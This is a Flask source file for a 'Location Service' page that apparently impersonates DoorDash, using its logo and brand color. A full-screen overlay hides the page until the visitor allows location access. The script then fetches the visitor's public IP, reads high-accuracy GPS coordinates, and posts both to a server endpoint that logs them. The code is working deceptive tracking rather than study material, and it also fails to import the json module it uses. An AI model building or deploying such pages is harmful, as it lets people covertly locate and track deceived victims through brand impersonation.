from flask import Flask, request, jsonify
import logging
from datetime import datetime
import os

app = Flask(__name__)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('gps_logger')

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Location Service</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #f8f8f8;
        }
        #gps-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);  /* Increased opacity */
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }
        #gps-modal {
            background: white;
            padding: 30px;
            border-radius: 12px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
        }
        #gps-logo {
            width: 140px;
            margin-bottom: 20px;
        }
        h2 {
            color: #2e3131;
            font-weight: 600;
            font-size: 22px;
            margin: 0 0 10px 0;
        }
        p {
            color: #6b7177;
            font-size: 16px;
            line-height: 1.5;
            margin: 0 0 20px 0;
        }
        #allow-btn {
            background: #FF3008;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        #allow-btn:hover {
            background: #e62e00;
        }
    </style>
</head>
<body>
    <!-- Your existing content would be here -->
    <h1>Welcome to the Service</h1>
    <p>Main content will appear after location permission</p>

    <!-- GPS Permission Overlay -->
    <div id="gps-overlay">
        <div id="gps-modal">
            <img src="https://cdn.doordash.com/managed/consumer/seo/doordash_seo_desktop.png" id="gps-logo" alt="Logo">
            <h2>We need your location to serve you better</h2>
            <p>Please allow location access to find nearby services</p>
            <button id="allow-btn">Allow Location Access</button>
        </div>
    </div>

    <script>
        async function logData(data) {
            try {
                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            } catch (error) {
                console.error('Logging error:', error);
            }
        }

        document.getElementById('allow-btn').addEventListener('click', async () => {
            try {
                // Get client IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                // Log permission request
                await logData({
                    type: 'permission_request',
                    ip: ipData.ip,
                    timestamp: new Date().toISOString()
                });

                // Request location
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000
                    });
                });

                // Log location data
                await logData({
                    type: 'location_data',
                    ip: ipData.ip,
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString()
                });

                // Hide overlay
                document.getElementById('gps-overlay').style.display = 'none';
                
            } catch (error) {
                console.error('Location error:', error);
                alert("Location access is required to continue.");
            }
        });
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    logger.info(f"Page accessed - IP: {client_ip}")
    return HTML_TEMPLATE

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    log_entry = {
        'timestamp': datetime.utcnow().isoformat(),
        'client_ip': client_ip,
        'event_data': data
    }
    
    logger.info(json.dumps(log_entry, indent=2))
    return jsonify({'status': 'success'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
